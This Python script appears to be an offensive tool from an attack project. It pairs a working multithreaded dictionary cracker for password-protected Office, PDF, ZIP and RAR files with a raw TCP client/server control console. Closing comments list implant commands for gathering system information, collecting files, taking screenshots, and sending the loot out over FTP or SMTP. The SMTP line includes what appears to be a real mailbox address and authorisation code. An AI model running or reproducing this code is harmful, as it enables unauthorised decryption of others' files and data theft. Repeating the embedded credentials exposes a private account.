#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket
from socket import *
from time import ctime
import time
import socketserver
import sys
from threading import Thread
import subprocess
import platform
import optparse
##########################
import zipfile
import msoffcrypto
import rarfile
import PyPDF4
######
import datetime
from tqdm import tqdm
from tqdm._tqdm import trange
import os
start =datetime.datetime.now()

office=['.ppt','.pptx','.xlsx','.xls','.doc','.docx']
exit_t=0
is_found=False

def extractFile(zname,passwords_arr):

    global is_found
    global start
    global office

    (filepath,tempfilename) = os.path.split(zname)
    (filename,extension) = os.path.splitext(tempfilename)
    m=extension
    if m in office:
        msfile = msoffcrypto.OfficeFile(open(zname,"rb"))#实例化类
        #print("get office")
    elif m=='.pdf':
        pdfReader = PyPDF4.PdfFileReader(open(zname,'rb'))
        #print("get pdf")
    elif m=='.zip':
        zFile = zipfile.ZipFile(zname)#实例化类
        #print("get zip")
    elif m=='.rar':
        rFile = rarfile.RarFile(zname)#实例化类
        #print("get rar")
    #msfile = msoffcrypto.OfficeFile(open(zname,"rb"))#实例化类
    bar = tqdm(passwords_arr)
    index=0
    for letter in bar:
        line =passwords_arr[index]
        index+=1
        password = line.strip('\n')
        if is_found==True:
            bar.close()
            return
	    #如果口令正确，输出口令，如果错误，抛出异常并测试下一个口令
        if m in office:
            try:
                msfile.load_key(password=password)
                msfile.decrypt(open('decrypto'+zname,'wb'))
                #print("get office")
                is_found=True
                #sys.stdout.flush()
                bar.close()
                time.sleep(1)
                print("Found Password:",password)
                end = datetime.datetime.now()
                print("run time:"+str((end-start).seconds)+"s")
                return
            except:
                pass
        elif m=='.pdf':
            if pdfReader.decrypt(password):
                is_found=True
                #sys.stdout.flush()
                bar.close()
                time.sleep(1)
                print("Found Password:",password)
                end = datetime.datetime.now()
                print("run time:"+str((end-start).seconds)+"s")
        elif m=='.zip':
            try:
                zFile.extractall(pwd=password.encode('utf-8'))
                is_found=True
                bar.close()
                time.sleep(1)
                print("Found Password:",password)
                end = datetime.datetime.now()
                print("run time"+str((end-start).seconds)+"s")
                return
            except:
                pass
        elif m=='.rar':
            try:
                rFile.extractall(pwd=password)       
                is_found=True
                #sys.stdout.flush()
                bar.close()
                time.sleep(1)           
                print("Found Password:",password)
                end = datetime.datetime.now()
                print("run time"+str((end-start).seconds)+"s")
                return
            except:
                pass
def senthread(ip,port,s_c):
    global exit_t
    if not s_c: #as server
        tcpSocket = socket(AF_INET,SOCK_STREAM)
        tcpSocket.bind((ip,port ))
        tcpSocket.listen(5)
        conn ,addr = tcpSocket.accept()
    else: #as client
        SADDR = (ip,port)
        conn = socket(AF_INET,SOCK_STREAM)

        conn.connect(SADDR) # 主动初始化与服务器端的连接
    while True:
        send_data=input(">")
        #发送数据
        if send_data == "q" :
            exit_t=1
            exit()
        res_data = bytes(send_data,encoding='utf-8')
        conn.sendall(res_data)
    conn.close()
    tcpSocket.close()
def recthread(ip,port,s_c):
    global exit_t
    if not s_c:
        tcpSocket = socket(AF_INET,SOCK_STREAM)
        # udpSocket = socket(AF_INET,SOCK_DGRAM)
        tcpSocket.bind((ip,port ))
        tcpSocket.listen(5)
        #等待客户端连接
        conn ,addr = tcpSocket.accept()
    else:
        SADDR = (ip,port)
        conn = socket(AF_INET,SOCK_STREAM)

        conn.connect(SADDR) # 主动初始化与服务器端的连接

    #接收到byte类型数据
    while True:
        if exit_t==1:
            return
        #拼接返回数据
        accept_data = conn.recv(1024)
        if not accept_data:
            break
        accept_data_str = str(accept_data,encoding='utf-8')
        print(accept_data_str,end="")
        sys.stdout.flush()
        #print(">",end="")
    conn.close()
    tcpSocket.close()

def main():
    parser = optparse.OptionParser("remote:usageprog -d server_ip  -s|-c \nlocal:usageprog -f crackfile_path -p passworddict_path")
    parser.add_option('-d',dest = 'ip',type = 'string',help = 'The server ip address')
    parser.add_option('-c',action='store_true', dest='client', default=False, help='choise as client')
    parser.add_option('-s',action='store_true', dest='server', default=False, help = 'choise as server')
    parser.add_option('-f',dest = 'aimfile',type = 'string',help = 'need crack file path')
    parser.add_option('-p',dest = 'password_dict',type = 'string',help = 'password_dict path')
    #parser.add_option('-p',dest = 'port',type = 'string',help = 'specify dictionary file')
    (options,args) = parser.parse_args()
    if (options.ip == None) and (options.aimfile !=None) and (options.password_dict != None):
        passFile = open(options.password_dict)#打开字典文件
        room=passFile.readlines()
        threads_num=8#确认线程数
        for i in range(threads_num):
            tag=int(len(room)/threads_num)
            if i!=threads_num-1:
                arr=(room[i*tag:(i+1)*tag])
            else:
                arr=(room[i*tag:])
            is_begin=True		
            t = Thread(target=extractFile,args=(options.aimfile,arr))
            t.start()
            #t.join()
            time.sleep(1)
    elif (options.ip != None) and (options.aimfile ==None) and (options.password_dict == None):
        client_bool=options.client
        server_bool=options.server
        ip=options.ip
        if client_bool and not server_bool:
            s_c=True
        elif not client_bool and server_bool:
            s_c=False
        elif not client_bool and not server_bool:
            s_c=False
        else:
            raise Exception("please chose -s or -c")
        send_port=9999
        recv_port=9998
        sthread=Thread(target=senthread,args=(ip,send_port,s_c))
        sthread.start()
        rthread=Thread(target=recthread,args=(ip,recv_port,s_c))
        rthread.start()
    else:
        raise Exception("lack args")
# getsysteminfo

# input_ftpinfo 192.168.2.102 root toor
# colle_ftpupload /collect.zip
# ftpupload /root/attack/project3/pdf.pdf /pdf.pdf
# ftpdownload  /root/attack/project3/linux.zip /linux.zip
# get_screen_ftp

# input_smtpinfo smtp.qq.com 465 2689825303@qq.com pgznkwstwhmfdgje 3196958726@qq.com
# colle_smtpupload
# smtpupload /root/attack/project3/pdf.pdf
# get_screen_smtp
# setserver 192.168.2.120
# setclient 192.168.2.120
# help
#
if __name__=='__main__':
    main()
